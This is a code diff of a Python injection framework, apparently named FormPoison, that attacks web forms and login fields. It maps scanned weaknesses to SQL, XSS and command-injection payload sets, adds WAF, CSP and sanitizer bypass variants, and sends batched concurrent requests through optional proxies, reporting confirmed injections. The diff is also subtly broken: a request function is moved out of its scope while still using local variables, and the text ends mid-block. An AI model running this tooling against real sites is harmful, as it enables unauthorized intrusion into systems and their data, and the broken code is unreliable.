@@ -11,7 +11,6 @@ from bs4 import BeautifulSoup
 import re
 import time
 from threading import Thread, Event
-from rich.progress import Progress, BarColumn, TimeRemainingColumn
 import threading
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -29,6 +28,7 @@ from csp_bypass import csp_bypass
 from sanitizer_bypass import sanitizer_bypass
 from encoder_bypass import encoder_bypass
 from size_overflow import size_overflow
+from dynamic_payloads_gen import generate_targeted_payloads
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -45,6 +45,51 @@ class GoScannerIntegration:
     def __init__(self):
         self.scanner_path = self.find_go_scanner()
         self.console = Console()
+        
+        self.vuln_to_payload_mapping = {
+            # SQL Injection patterns
+            'sql_injection': ['SQL'],
+            'length_validator': ['SQL', 'Java'],
+            'size_validator': ['SQL', 'Java'],
+            'array_index_check': ['SQL', 'Java'],
+            
+            # XSS patterns  
+            'xss': ['HTML', 'XSS'],
+            'equals_type_check': ['HTML', 'Java'],
+            'type_casting': ['HTML', 'Java'],
+            
+            # Command Injection
+            'command_injection': ['Java', 'Command'],
+            'file_handling': ['Java', 'Path'],
+            'network_io': ['Java'],
+            
+            # Deserialization
+            'insecure_deserialization': ['Java', 'Serialization'],
+            'reflection': ['Java'],
+            'serialization': ['Java'],
+            
+            # Other Java-specific
+            'instanceof_check': ['Java'],
+            'null_check': ['Java'],
+            'boundary_check': ['Java'],
+            'regex_validation': ['Java'],
+            'unchecked_exception': ['Java'],
+            'string_concatenation': ['Java', 'SQL'],
+            'date_handling': ['Java'],
+            'enum_usage': ['Java'],
+            'annotation_usage': ['Java'],
+            'lambda_expression': ['Java'],
+            'stream_usage': ['Java'],
+            'optional_usage': ['Java'],
+            'concurrency': ['Java'],
+            'resource_management': ['Java'],
+            
+            # Additional patterns
+            'type_confusion': ['Java'],
+            'race_condition': ['Java'],
+            'insecure_randomness': ['Java'],
+            'path_traversal': ['Path', 'Java']
+        }
 
     def find_go_scanner(self):
         possible_paths = [
@@ -69,12 +114,12 @@ class GoScannerIntegration:
 
         return None
 
-    def run_go_scanner(self, url, max_urls=100, max_depth=3, workers=10):
+    def run_go_scanner(self, url, max_urls=100, max_depth=3, workers=10, proxy_url=None):
         if not self.scanner_path:
             self.console.print("[bold red]Go scanner not found![/bold red]")
             self.console.print("Please compile the Go scanner first:")
             self.console.print("1. go mod init vulnerability-scanner")
-            self.console.print("2. go mod tidy")
+            self.console.print("2. go mod tidy") 
             self.console.print("3. go build -o scanner")
             return None
 
@@ -86,6 +131,9 @@ class GoScannerIntegration:
                 str(max_depth),
                 str(workers)
             ]
+            
+            if proxy_url:
+                cmd.append(f"--proxy={proxy_url}")
 
             self.console.print(f"[bold green]Running Go scanner: {' '.join(cmd)}[/bold green]")
             self.console.print("[yellow]Don't worry about scan time! It works just fine, but be patient during scan...[/yellow]")
@@ -100,7 +148,7 @@ class GoScannerIntegration:
                 dots = itertools.cycle(['.', '..', '...', '....'])
                 stages = [
                     "🔍 Crawling websites",
-                    "📝 Analyzing source code",
+                    "📝 Analyzing source code", 
                     "🛡️ Checking security patterns",
                     "📊 Generating report"
                 ]
@@ -404,23 +452,25 @@ class GoScannerIntegration:
                 recommendations.append(f"Fuzz testing for {vuln_type} implementation")
 
         return list(set(recommendations))
-    def scan_and_analyze(self, url, max_urls=100, max_depth=3, workers=10):
+
+    def scan_and_analyze(self, url, max_urls=100, max_depth=3, workers=10, proxy_url=None):
         # full analysis with GO scanner
         self.console.print(f"[bold blue]Starting Go scanner for: {url}[/bold blue]")
-
+        if proxy_url:
+            self.console.print(f"[bold yellow]Using proxy.[/bold yellow]")
         # run scan
-        report_file = self.run_go_scanner(url, max_urls, max_depth, workers)
+        report_file = self.run_go_scanner(url, max_urls, max_depth, workers, proxy_url)
 
         if not report_file:
             self.console.print("[bold red]Scan failed! No report file generated.[/bold red]")
-            return []
+            return [], []
 
         # parsing raport
         scan_report = self.parse_scan_report(report_file)
 
         if not scan_report:
             self.console.print("[bold yellow]Failed to parse scan report[/bold yellow]")
-            return []
+            return [], []
 
         self.console.print(f"[bold green]Scan completed![/bold green]")
         self.console.print(f"URLs scanned: {scan_report.get('scanned_urls', 0)}")
@@ -435,7 +485,120 @@ class GoScannerIntegration:
         else:
             self.console.print("[bold yellow]No specific attack recommendations from Go scanner.[/bold yellow]")
 
-        return recommendations
+        return scan_report, recommendations
+
+    def map_vulnerabilities_to_payloads(self, scan_report, all_payloads):
+        targeted_payloads = []
+        vulnerability_categories = set()
+        
+        if not scan_report or 'vulnerabilities' not in scan_report:
+            return all_payloads, vulnerability_categories
+
+        # get all vulns 
+        for vuln in scan_report['vulnerabilities']:
+            vuln_type = vuln['pattern']
+            vulnerability_categories.add(vuln_type)
+            
+            # map vuln type to payload category
+            if vuln_type in self.vuln_to_payload_mapping:
+                payload_categories = self.vuln_to_payload_mapping[vuln_type]
+                
+                for payload in all_payloads:
+                    if payload['category'] in payload_categories:
+                        enhanced_payload = payload.copy()
+                        enhanced_payload['targeted_vulnerability'] = vuln_type
+                        enhanced_payload['confidence'] = self.calculate_confidence(vuln, payload)
+                        targeted_payloads.append(enhanced_payload)
+
+        if not targeted_payloads:
+            self.console.print("[yellow]No specific payload mapping found, using all payloads[/yellow]")
+            return all_payloads, vulnerability_categories
+        
+        # remove duplicates 
+        unique_payloads = {}
+        for payload in targeted_payloads:
+            key = payload['inputField']
+            if key not in unique_payloads or payload.get('confidence', 0) > unique_payloads[key].get('confidence', 0):
+                unique_payloads[key] = payload
+        
+        return list(unique_payloads.values()), vulnerability_categories
+
+    def calculate_confidence(self, vulnerability, payload):
+        confidence = 0.5 
+        
+        # increase confidence if 1:1 found. 
+        vuln_type = vulnerability['pattern']
+        payload_category = payload['category']
+        
+        if vuln_type == 'sql_injection' and payload_category == 'SQL':
+            confidence += 0.3
+        elif vuln_type == 'xss' and payload_category in ['HTML', 'XSS']:
+            confidence += 0.3
+        elif 'injection' in vuln_type and 'injection' in payload_category.lower():
+            confidence += 0.2
+            
+        # severity
+        severity = vulnerability.get('severity', 'MEDIUM')
+        if severity == 'HIGH':
+            confidence += 0.1
+        elif severity == 'CRITICAL':
+            confidence += 0.2
+            
+        return min(confidence, 1.0)
+
+    def generate_context_aware_payloads(self, scan_report, base_payloads, bypass_flags=None):
+        targeted_payloads, vuln_categories = self.map_vulnerabilities_to_payloads(scan_report, base_payloads)
+        
+        # applying bypass techniques based on scan results
+        enhanced_payloads = self.apply_bypass_techniques(targeted_payloads, scan_report, bypass_flags)
+        
+        self.console.print(f"[green]🎯 Targeted payload generation:[/green]")
+        self.console.print(f"[blue]Vulnerabilities detected: {len(vuln_categories)}[/blue]")
+        self.console.print(f"[blue]Targeted payloads: {len(enhanced_payloads)}[/blue]")
+        
+        for vuln in vuln_categories:
+            matching_payloads = [p for p in enhanced_payloads if p.get('targeted_vulnerability') == vuln]
+            if matching_payloads:
+                self.console.print(f"[yellow]  {vuln}: {len(matching_payloads)} payloads[/yellow]")
+        
+        return enhanced_payloads
+
+    def apply_bypass_techniques(self, payloads, scan_report, bypass_flags):
+        enhanced_payloads = []
+        
+        for payload in payloads:
+            enhanced_payloads.append(payload)
+            
+            vuln_type = payload.get('targeted_vulnerability', '')
+            
+            if bypass_flags.get('waf_bypass') and any(inj in vuln_type.lower() for inj in ['injection', 'xss', 'sql']):
+                bypassed = waf_bypass.generate_bypassed_payloads(payload['inputField'], 2)
+                for bp in bypassed:
+                    enhanced_payload = payload.copy()
+                    enhanced_payload['inputField'] = bp
+                    enhanced_payload['category'] = payload['category'] + '_WAF_BYPASS'
+                    enhanced_payload['bypass_technique'] = 'WAF'
+                    enhanced_payloads.append(enhanced_payload)
+
+            if bypass_flags.get('csp_bypass') and payload['category'] in ['HTML', 'XSS']:
+                bypassed = csp_bypass.generate_csp_bypass_payloads(payload['inputField'], 2)
+                for bp in bypassed:
+                    enhanced_payload = payload.copy()
+                    enhanced_payload['inputField'] = bp
+                    enhanced_payload['category'] = payload['category'] + '_CSP_BYPASS'
+                    enhanced_payload['bypass_technique'] = 'CSP'
+                    enhanced_payloads.append(enhanced_payload)
+
+            if bypass_flags.get('sanitizer_bypass'):
+                bypassed = sanitizer_bypass.generate_sanitizer_bypass_payloads(payload['inputField'], 2)
+                for bp in bypassed:
+                    enhanced_payload = payload.copy()
+                    enhanced_payload['inputField'] = bp
+                    enhanced_payload['category'] = payload['category'] + '_SANITIZER_BYPASS'
+                    enhanced_payload['bypass_technique'] = 'SANITIZER'
+                    enhanced_payloads.append(enhanced_payload)
+
+        return enhanced_payloads
 #########################DETECTIONS###################
 def detect_framework(headers, content):
     framework_detected = None
@@ -851,7 +1014,7 @@ def show_banner():
                                        '--'
               Input fields and forms injection framework.
               Developed by: https://github.com/csshark
-              Note: This tool is amateur I didn't launch thousands of tests so there might be bugs.
+                                                v. 1.0.1.
     """
 
     def animate_falling_texts(texts, banner, start_line=0, end_line=3):
@@ -1213,7 +1376,7 @@ def analyze_response(content, headers, payload_category, payload, verbose_all=Fa
                 execution_confidence = "VERY_HIGH"
 
             console.print(f"[bold red]💀 SQL INJECTION CONFIRMED ({execution_confidence} confidence) 💀[/bold red]")
-            console.print(f"[bold green]✅ Payload executed successfully![/bold green]")
+            console.print(f"[bold green] Payload executed successfully![/bold green]")
             vulnerabilities.append(f"CONFIRMED_SQL_INJECTION ({execution_confidence})")
 
     elif payload_category == "HTML" or payload_category == "XSS":
@@ -1225,7 +1388,7 @@ def analyze_response(content, headers, payload_category, payload, verbose_all=Fa
                 execution_confidence = "VERY_HIGH"
 
             console.print(f"[bold red]💀 XSS CONFIRMED ({execution_confidence} confidence) 💀[/bold red]")
-            console.print(f"[bold green]✅ XSS payload executed successfully![/bold green]")
+            console.print(f"[bold green] XSS payload executed successfully![/bold green]")
             vulnerabilities.append(f"CONFIRMED_XSS ({execution_confidence})")
 
     if verbose_all:
@@ -1300,172 +1463,99 @@ async def test_input_field(url, payloads, threat_type, cookies, user_agents, inp
 
     semaphore = asyncio.Semaphore(max_concurrent if brute_mode else 1)
 
-    async def test_payload(payload):
-        async with semaphore:
-            try:
-                current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
-                data = {}
+async def test_payload(payload):
+    async with semaphore:
+        try:
+            current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0."
+            headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
+            data = {}
 
-                # typical input fill
-                for field in all_input_fields:
-                    field_name = field.get('name', 'input_field')
-                    if field_name == input_field.get('name', 'input_field'):
-                        # payload fill
-                        data[field_name] = payload['inputField']
+            for field in all_input_fields:
+                field_name = field.get('name', 'input_field')
+                if field_name == input_field.get('name', 'input_field'):
+                    data[field_name] = payload['inputField']
+                else:
+                    if field.get('type') == 'email':
+                        data[field_name] = 'test@example.com'
+                    elif field.get('type') == 'password':
+                        data[field_name] = 'password123'
+                    elif field.get('name', '').lower() in ['username', 'user', 'login']:
+                        data[field_name] = 'test_user'
                     else:
-                        # rest of fields common values
-                        if field.get('type') == 'email':
-                            data[field_name] = 'test@example.com'
-                        elif field.get('type') == 'password':
-                            # password case
-                            data[field_name] = 'password123'
-                        elif field.get('name', '').lower() in ['username', 'user', 'login']:
-                            # login case
-                            data[field_name] = 'test_user'
-                        else:
-                            # rest of cases
-                            data[field_name] = 'test_value'
+                        data[field_name] = 'test_value'
 
-                if brute_mode:
-                    async with aiohttp.ClientSession(
-                        cookie_jar=cookie_jar,
-                        connector=connector,
-                        timeout=timeout_config
-                    ) as session:
-                        async with session.request(
-                            method, url, data=data, headers=headers,
-                            proxy=proxies.get('http') if proxies else None, ssl=ssl_verify
-                        ) as response:
+            if brute_mode:
+                async with aiohttp.ClientSession(
+                    cookie_jar=cookie_jar,
+                    connector=connector,
+                    timeout=timeout_config
+                ) as session:
+                    async with session.request(
+                        method, url, data=data, headers=headers,
+                        proxy=proxies.get('http') if proxies else None, ssl=ssl_verify
+                    ) as response:
+                        content = await response.text()
+                        status_code = response.status
+            else:
+                ssl_context = ssl.create_default_context()
+                if ssl_cert and ssl_key:
+                    ssl_context.load_cert_chain(ssl_cert, ssl_key)
+
+                async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
+                    if method == "GET":
+                        async with session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                             content = await response.text()
                             status_code = response.status
+                    elif method == "POST":
+                        async with session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
+                            content = await response.text()
+                            status_code = response.status
+                    elif method == "PUT":
+                        async with session.put(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
+                            content = await response.text()
+                            status_code = response.status
+                    elif method == "DELETE":
+                        async with session.delete(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
+                            content = await response.text()
+                            status_code = response.status
+
+            vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'], verbose_all)
+            
+            if verbose:
+                timestamp = time.strftime("%H:%M:%S")
+                short_payload = payload['inputField'][:50] + "..." if len(payload['inputField']) > 50 else payload['inputField']
+                injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
+                
+                if injection_detected:
+                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [bold red]{status_code} 💀[/bold red]")
                 else:
-                    ssl_context = ssl.create_default_context()
-                    if ssl_cert and ssl_key:
-                        ssl_context.load_cert_chain(ssl_cert, ssl_key)
+                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [green]{status_code}[/green]")
 
-                    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
-                        if method == "GET":
-                            async with session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
-                                content = await response.text()
-                                status_code = response.status
-                        elif method == "POST":
-                            async with session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
-                                content = await response.text()
-                                status_code = response.status
-                        elif method == "PUT":
-                            async with session.put(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
-                                content = await response.text()
-                                status_code = response.status
-                        elif method == "DELETE":
-                            async with session.delete(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
-                                content = await response.text()
-                                status_code = response.status
+            result = {
+                "payload": payload['inputField'],
+                "method": method,
+                "user_agent": current_user_agent,
+                "response_code": status_code,
+                "vulnerabilities": vulnerabilities
+            }
 
-                vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'], verbose_all)
+            return result
 
-                result = {
-                    "payload": payload['inputField'],
-                    "method": method,
-                    "user_agent": current_user_agent,
-                    "response_code": status_code,
-                    "vulnerabilities": vulnerabilities
-                }
-
-                return result
-
-            except Exception as e:
-                current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
-                return {
-                    "payload": payload['inputField'],
-                    "method": method,
-                    "user_agent": current_user_agent,
-                    "response_code": "Error",
-                    "vulnerabilities": [f"Request Failed: {str(e)}"]
-                }
-
-    if brute_mode:
-        all_payloads = list(payloads)
-        total_batches = (len(all_payloads) + batch_size - 1) // batch_size
-
-        with Progress(BarColumn(bar_width=None), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn(), console=console) as progress:
-            main_task = progress.add_task("[cyan]Overall progress...", total=len(all_payloads))
-
-            for batch_num in range(total_batches):
-                start_idx = batch_num * batch_size
-                end_idx = min(start_idx + batch_size, len(all_payloads))
-                batch_payloads = all_payloads[start_idx:end_idx]
-
-                tasks = [test_payload(payload) for payload in batch_payloads]
-                for future in asyncio.as_completed(tasks):
-                    result = await future
-                    results.append(result)
-
-                    # Update UI
-                    table.add_row(
-                        result["payload"],
-                        result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
-                        str(result["response_code"]),
-                        ", ".join(result["vulnerabilities"])
-                    )
-
-                    progress.update(main_task, advance=1)
-
-                    if verbose or verbose_all:
-                        console.print(f"[bold blue]Tested payload: {result['payload']}[/bold blue]")
-                        console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")
-                        console.print(f"[bold blue]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold blue]")
-
-                # add batch delay work somehow
-                if batch_num < total_batches - 1 and batch_delay > 0:
-                    await asyncio.sleep(batch_delay)
-
-        # clse connector in brute mode
-        if connector:
-            await connector.close()
-
-    else:
-        with Progress(BarColumn(bar_width=None), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn(), console=console) as progress:
-            task = progress.add_task("[cyan]Testing...", total=len(payloads))
-
-            for payload in payloads:
-                result = await test_payload(payload)
-                results.append(result)
-
-                table.add_row(
-                    result["payload"],
-                    result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
-                    str(result["response_code"]),
-                    ", ".join(result["vulnerabilities"])
-                )
-
-                progress.update(task, advance=1)
-                if secs > 0:
-                    await asyncio.sleep(secs)
-
-    positive_responses = sum(1 for r in results if r['response_code'] == 200)
-    if positive_responses > threshold:
-        console.print(f"[bold red]Too many positive responses were given ({positive_responses}/{len(payloads)}). You might consider this result as false-positive.[/bold red]")
-
-    console.print(table)
-
-    # metadata based results
-    results_metadata = {
-        "parameters": {
-            "brute_mode": brute_mode,
-            "max_concurrent": max_concurrent,
-            "timeout": timeout,
-            "batch_size": batch_size,
-            "batch_delay": batch_delay,
-            "max_retries": max_retries
-        },
-        "results": results
-    }
-
-    with open("test_results.json", "w") as f:
-        json.dump(results_metadata, f, indent=4)
-
-    console.print(f"[bold green]Test results saved to 'test_results.json'[/bold green]")
+        except Exception as e:
+            current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
+            
+            if verbose:
+                timestamp = time.strftime("%H:%M:%S")
+                short_payload = payload['inputField'][:50] + "..." if len(payload['inputField']) > 50 else payload['inputField']
+                console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [red]Error[/red]")
+            
+            return {
+                "payload": payload['inputField'],
+                "method": method,
+                "user_agent": current_user_agent,
+                "response_code": "Error",
+                "vulnerabilities": [f"Request Failed: {str(e)}"]
+            }
 
 async def test_login_input_fields(url, payloads, cookies, user_agents, input_fields, proxies=None, verbose=False, verbose_all=False, secs=0, filter_patterns=None, brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
     results = []
@@ -1576,6 +1666,9 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
     async def test_login_combination(login_payload, password_payload, payload_category):
         async with semaphore:
             try:
+                if verbose:
+                    timestamp = time.strftime("%H:%M:%S")
+                    console.print(f"[{timestamp}] [INFO] Testing login '{login_payload}' with password payload '{password_payload}' -> ", end="")
                 current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1."
                 headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
                 data = {
@@ -1606,6 +1699,12 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
 
                 vulnerabilities = analyze_response(content, response.headers, payload_category, password_payload, verbose_all)
 
+                if verbose:
+                    injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
+                    if injection_detected:
+                        console.print(f"[bold red]{status_code}[/bold red]")
+                    else:
+                        console.print(f"[green]{status_code}[/green]")
                 result = {
                     "login_payload": login_payload,
                     "password_payload": password_payload,
@@ -1619,6 +1718,9 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
 
             except Exception as e:
                 current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
+                if verbose:
+                    timestamp = time.strftime("%H:%M:%S")
+                    console.print(f"[{timestamp}] [INFO] Testing login combination -> [red]Error[/red]")
                 return {
                     "login_payload": login_payload,
                     "password_payload": password_payload,
@@ -1636,72 +1738,49 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
     total_tests = len(test_combinations)
 
     if brute_mode:
-        all_combinations = list(test_combinations)
-        total_batches = (len(all_combinations) + batch_size - 1) // batch_size
+        all_tasks = [test_login_combination(login, pwd, category) for login, pwd, category in test_combinations]
+        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
+        completed = 0
+        total = len(all_tasks)
 
-        with Progress() as progress:
-            main_task = progress.add_task("[cyan]Testing login...", total=total_tests)
+        for batch_num in range(total_batches):
+            start_idx = batch_num * batch_size
+            end_idx = min(start_idx + batch_size, len(all_tasks))
+            batch_tasks = all_tasks[start_idx:end_idx]
 
-            for batch_num in range(total_batches):
-                start_idx = batch_num * batch_size
-                end_idx = min(start_idx + batch_size, len(all_combinations))
-                batch_combinations = all_combinations[start_idx:end_idx]
-
-                tasks = [test_login_combination(login, pwd, category) for login, pwd, category in batch_combinations]
-                for future in asyncio.as_completed(tasks):
-                    result = await future
+            console.print(f"[dim]Batch {batch_num + 1}/{total_batches} ({len(batch_tasks)} requests)[/dim]")
+            
+            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
+            
+            for result in batch_results:
+                if isinstance(result, dict):
                     results.append(result)
+                    completed += 1
+            
+            console.print(f"[dim]Progress: {completed}/{total} ({completed/total*100:.1f}%)[/dim]")
 
-                    # Update UI
-                    table.add_row(
-                        result["login_payload"],
-                        result["password_payload"],
-                        result["payload_category"],
-                        result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
-                        str(result["response_code"]),
-                        ", ".join(result["vulnerabilities"])
-                    )
-
-                    progress.update(main_task, advance=1)
-
-                    if verbose or verbose_all:
-                        console.print(f"[bold blue]Testing login: {result['login_payload']}, password: {result['password_payload']} ({result['payload_category']})[/bold blue]")
-                        console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")
-                        console.print(f"[bold blue]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold blue]")
-
-                if batch_num < total_batches - 1 and batch_delay > 0:
-                    await asyncio.sleep(batch_delay)
-
-        if connector:
-            await connector.close()
+            if batch_num < total_batches - 1 and batch_delay > 0:
+                await asyncio.sleep(batch_delay)
 
     else:
-        with Progress() as progress:
-            task = progress.add_task("[cyan]Testing login...", total=total_tests)
+        # NORMAL MODE
+        console.print(f"[bold cyan]Starting sequential login testing with {len(test_combinations)} combinations[/bold cyan]")
+        
+        completed = 0
+        total = len(test_combinations)
+        
+        for login_payload, password_payload, payload_category in test_combinations:
+            result = await test_login_combination(login_payload, password_payload, payload_category)
+            results.append(result)
+            completed += 1
 
-            for login_payload, password_payload, payload_category in test_combinations:
-                result = await test_login_combination(login_payload, password_payload, payload_category)
-                results.append(result)
+            if verbose or verbose_all:
+                console.print(f"[bold blue]Testing login: {result['login_payload']}, password: {result['password_payload']} ({result['payload_category']})[/bold blue]")
+                console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")
+                console.print(f"[bold blue]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold blue]")
 
-                table.add_row(
-                    result["login_payload"],
-                    result["password_payload"],
-                    result["payload_category"],
-                    result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
-                    str(result["response_code"]),
-                    ", ".join(result["vulnerabilities"])
-                )
-
-                progress.update(task, advance=1)
-
-                if verbose or verbose_all:
-                    console.print(f"[bold blue]Testing login: {result['login_payload']}, password: {result['password_payload']} ({result['payload_category']})[/bold blue]")
-                    console.print(f"[bold blue]Response code: {result['response_code']}[/bold blue]")
-                    console.print(f"[bold blue]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold blue]")
-
-                if secs > 0:
-                    await asyncio.sleep(secs)
-
+            if secs > 0:
+                await asyncio.sleep(secs)
     console.print(table)
 
     # Save results with metadata
@@ -1789,8 +1868,7 @@ def find_field_by_name(input_fields, field_name):
     return None
 
 async def test_all_forms(url, payloads, threat_type, cookies, user_agents, method="POST", proxies=None, ssl_cert=None, ssl_key=None, filter=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0, brute_mode=False, max_concurrent=50, timeout=15.0, batch_size=100, batch_delay=1.0, max_retries=2):
-    results = []
-
+    results = [] 
     initial_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
     content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)
 
@@ -1831,7 +1909,7 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
     async def test_form_with_payload(form, payload):
         async with semaphore:
             try:
-                current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                current_user_agent = random.choice(user_agents) if user_agents else "FormPoison/v.1.0.1"
                 headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
 
                 data = {}
@@ -1845,7 +1923,6 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
                     field_name = field.get('name', 'input_field')
                     field_type = field.get('type', 'text').lower()
 
-                    # Inject payload into all text fields (if not in login mode bruh)
                     if field_type in ['text', 'email', 'search', 'url', 'tel'] or field.name in ['textarea', 'select']:
                         data[field_name] = payload['inputField']
                     elif field_type == 'password':
@@ -1855,7 +1932,6 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
                     else:
                         data[field_name] = 'test_value'
 
-                # request with optimized session for brute mode
                 if brute_mode:
                     async with aiohttp.ClientSession(
                         cookie_jar=cookie_jar,
@@ -1888,6 +1964,18 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
 
                 vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'], verbose_all)
 
+                timestamp = time.strftime("%H:%M:%S")
+                short_payload = payload['inputField'][:80] + "..." if len(payload['inputField']) > 80 else payload['inputField']
+                injection_detected = any("CONFIRMED" in vuln for vuln in vulnerabilities)
+                
+                if injection_detected:
+                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [bold red]{status_code} VULNERABLE[/bold red]")
+                    for vuln in vulnerabilities:
+                        if "CONFIRMED" in vuln:
+                            console.print(f"[{timestamp}] [CRITICAL] {vuln}")
+                else:
+                    console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [green]{status_code}[/green]")
+
                 result = {
                     "form_action": form.get('action', ''),
                     "form_method": form.get('method', 'GET'),
@@ -1901,6 +1989,10 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
 
             except Exception as e:
                 current_user_agent = user_agents[0] if user_agents else "FormPoison/v.1.0.1"
+                timestamp = time.strftime("%H:%M:%S")
+                short_payload = payload['inputField'][:80] + "..." if len(payload['inputField']) > 80 else payload['inputField']
+                console.print(f"[{timestamp}] [INFO] Testing payload {short_payload} -> [red]Error: {str(e)}[/red]")
+                
                 return {
                     "form_action": form.get('action', ''),
                     "form_method": form.get('method', 'GET'),
@@ -1910,129 +2002,64 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
                     "vulnerabilities": [f"Request Failed: {str(e)}"]
                 }
 
-    # prepare all test combinations
-    test_combinations = []
-    for form in forms:
-        for payload in payloads:
-            test_combinations.append((form, payload))
-
-    total_tests = len(test_combinations)
-
-    table = Table(title=f"All Forms Test Results" + (" | BRUTE MODE" if brute_mode else ""))
-    table.add_column("Form Action", style="cyan", no_wrap=False)
-    table.add_column("Payload", style="cyan", no_wrap=False)
-    table.add_column("User Agent", style="cyan", no_wrap=False)
-    table.add_column("Response Code", justify="right", style="magenta")
-    table.add_column("Vulnerability Detected", style="bold green")
-
+    # BRUTE MODE
     if brute_mode:
-        # BRUTE MODE: Parallel processing with batching
-        all_combinations = list(test_combinations)
-        total_batches = (len(all_combinations) + batch_size - 1) // batch_size
+        console.print(f"[bold cyan]🚀 Starting brute force with {len(forms)} forms × {len(payloads)} payloads = {len(forms) * len(payloads)} total requests[/bold cyan]")
+        
+        all_tasks = []
+        for form_idx, form in enumerate(forms):
+            for payload_idx, payload in enumerate(payloads):
+                all_tasks.append(test_form_with_payload(form, payload))
 
-        with Progress(
-            BarColumn(bar_width=None),
-            "[progress.percentage]{task.percentage:>3.0f}%",
-            TimeRemainingColumn(),
-            console=console
-        ) as progress:
+        total_batches = (len(all_tasks) + batch_size - 1) // batch_size
+        completed = 0
+        total = len(all_tasks)
 
-            main_task = progress.add_task("[cyan]Testing all forms...", total=total_tests)
+        for batch_num in range(total_batches):
+            start_idx = batch_num * batch_size
+            end_idx = min(start_idx + batch_size, len(all_tasks))
+            batch_tasks = all_tasks[start_idx:end_idx]
 
-            for batch_num in range(total_batches):
-                start_idx = batch_num * batch_size
-                end_idx = min(start_idx + batch_size, len(all_combinations))
-                batch_combinations = all_combinations[start_idx:end_idx]
-
-                # Process current batch in parallel
-                tasks = [test_form_with_payload(form, payload) for form, payload in batch_combinations]
-                for future in asyncio.as_completed(tasks):
-                    result = await future
+            console.print(f"[dim]Batch {batch_num + 1}/{total_batches} ({len(batch_tasks)} requests)[/dim]")
+            
+            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
+            
+            for result in batch_results:
+                if isinstance(result, dict):  # Skip exceptions
                     results.append(result)
+                    completed += 1
+            
+            console.print(f"[dim]Progress: {completed}/{total} ({completed/total*100:.1f}%)[/dim]")
 
-                    # Update UI
-                    table.add_row(
-                        result["form_action"],
-                        result["payload"],
-                        result["user_agent"][:50] + "..." if len(result["user_agent"]) > 50 else result["user_agent"],
-                        str(result["response_code"]),
-                        ", ".join(result["vulnerabilities"])
-                    )
+            if batch_num < total_batches - 1 and batch_delay > 0:
